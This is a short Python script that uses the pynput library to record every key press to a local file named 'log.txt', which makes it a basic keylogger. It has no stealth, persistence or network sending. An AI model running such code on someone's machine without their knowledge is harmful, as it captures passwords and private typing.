from pynput.keyboard import Listener

def write_to_file(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

with Listener(on_press=write_to_file) as listener:
    listener.join()
